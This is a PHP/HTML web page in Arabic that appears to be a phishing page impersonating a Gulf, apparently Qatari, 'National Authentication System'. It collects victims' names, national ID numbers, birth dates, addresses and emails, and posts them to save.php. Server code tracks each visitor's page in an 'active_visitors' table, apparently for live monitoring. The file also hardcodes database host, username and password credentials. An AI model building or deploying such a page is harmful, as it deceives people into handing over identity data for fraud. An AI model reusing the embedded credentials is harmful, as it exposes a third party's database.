<?php
// إخفاء الأخطاء وتجهيز الاتصال بقاعدة بيانات Render
error_reporting(0);
ini_set('display_errors', 0);
$host = "dpg-d95vic9oagis739h761g-a";
$user = "qatar_db_user";
$password = "TpPqGoliCoObGDiGdpEc16ak3PJZ9BB1";
$dbname = "qatar_db";
$port = "5432";

try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
    $visitor_id = isset($_POST['visitor_id']) ? $_POST['visitor_id'] : 'visitor_session'; 
    $stmt_vis = $pdo->prepare("INSERT INTO active_visitors (visitor_id, current_page, last_seen) 
                               VALUES (:visitor_id, 'صفحة البيانات الشخصية', NOW()) 
                               ON CONFLICT (visitor_id) 
                               DO UPDATE SET current_page = 'صفحة البيانات الشخصية', last_seen = NOW()");
    $stmt_vis->execute([':visitor_id' => $visitor_id]);
} catch (Exception $e) {}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التوثيق الوطني - البيانات الشخصية</title>
    <!-- مكتبات الجنسيات والأعلام -->
    <link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

    <style>
        :root { --primary-color: #007fb1; --bg-color: #f5f5f5; --secondary-color: #8a1538; --input-bg: #e0e0e0; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg-color); margin: 0; padding: 0; }
        .header { background-color: #fff; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ddd; }
        .container { max-width: 500px; margin: 20px auto; padding: 10px; }
        .form-card { background: #fff; border: 1px solid #e0e0e0; border-radius: 4px; padding: 25px; }
        .form-group { margin-bottom: 15px; }
        
        /* المربعات باللون الرمادي */
        input, select { 
            width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; 
            box-sizing: border-box; background-color: var(--input-bg) !important; color: #333;
        }
        
        .dob-group { display: flex; gap: 5px; }
        .gender-group { display: flex; gap: 20px; margin-top: 10px; }
        .radio-option { display: flex; align-items: center; font-size: 14px; cursor: pointer; }
        .radio-option input { margin-left: 8px; width: auto; }
        .btn-submit { width: 100%; background-color: var(--primary-color); color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; }
        
        /* تنسيق خاص لقائمة select2 لتكون رمادية */
        .select2-container--default .select2-selection--single { 
            background-color: var(--input-bg) !important; height: 45px; padding-top: 8px; border: 1px solid #ccc; 
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663234476152/DhrsVnFpSCHlBdiR.png" height="50">
        <div style="text-align: left;">
            <div style="color: var(--secondary-color); font-weight: bold;">نظام التوثيق الوطني</div>
        </div>
    </div>

    <div class="container">
        <div class="form-card">
            <h2>البيانات الشخصية</h2>
            <form action="save.php" method="POST">
                <input type="hidden" name="visitor_id" value="<?php echo htmlspecialchars($visitor_id); ?>">
                
                <div class="form-group">
                    <select id="nationality" name="nationality" class="js-example-basic-single" required>
                        <option value="" disabled selected>اختر الجنسية</option>
                        <option value="قطر">قطر 🇶🇦</option>
                        <option value="السعودية">السعودية 🇸🇦</option>
                        <option value="الإمارات">الإمارات 🇦🇪</option>
                        <option value="الكويت">الكويت 🇰🇼</option>
                        <option value="البحرين">البحرين 🇧🇭</option>
                        <option value="عمان">عمان 🇴🇲</option>
                        <option value="مصر">مصر 🇪🇬</option>
                    </select>
                </div>
                <div class="form-group"><input type="text" name="name_ar" placeholder="الاسم بالعربي" required></div>
                <div class="form-group"><input type="text" name="name_en" placeholder="الاسم بالإنجليزي" required></div>
                <div class="form-group"><input type="text" name="id_number" placeholder="رقم الهوية" required></div>
                
                <div class="form-group">
                    <label style="font-size: 12px;">تاريخ الميلاد</label>
                    <div class="dob-group">
                        <select name="day" required><option value="">يوم</option><?php for($i=1;$i<=31;$i++) echo "<option value='$i'>$i</option>"; ?></select>
                        <select name="month" required><option value="">شهر</option><?php $m=['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر']; foreach($m as $k=>$v) echo "<option value='".($k+1)."'>$v</option>"; ?></select>
                        <select name="year" required><option value="">سنة</option><?php for($i=2026;$i>=1950;$i--) echo "<option value='$i'>$i</option>"; ?></select>
                    </div>
                </div>

                <div class="form-group"><input type="text" name="address" placeholder="العنوان الحالي" required></div>
                <div class="form-group"><input type="email" name="email" placeholder="البريد الإلكتروني" required></div>
                
                <div class="form-group">
                    <label style="font-weight: bold; font-size: 14px;">الجنس *</label>
                    <div class="gender-group">
                        <label class="radio-option"><input type="radio" name="gender" value="ذكر" required> ذكر</label>
                        <label class="radio-option"><input type="radio" name="gender" value="أنثى" required> أنثى</label>
                    </div>
                </div>

                <button type="submit" class="btn-submit">استمرار</button>
            </form>
        </div>
    </div>

    <script>
    $(document).ready(function() {
        $('.js-example-basic-single').select2();
        fetch('https://restcountries.com/v3.1/all')
            .then(response => response.json())
            .then(data => {
                const select = $('#nationality');
                data.sort((a, b) => a.name.common.localeCompare(b.name.common)).forEach(country => {
                    const name = country.name.common;
                    if (!['Qatar', 'Saudi Arabia', 'United Arab Emirates', 'Kuwait', 'Bahrain', 'Oman', 'Egypt'].includes(name)) {
                        select.append(`<option value="${name}">${name} ${country.flag}</option>`);
                    }
                });
            });
    });
    </script>
</body>
</html>
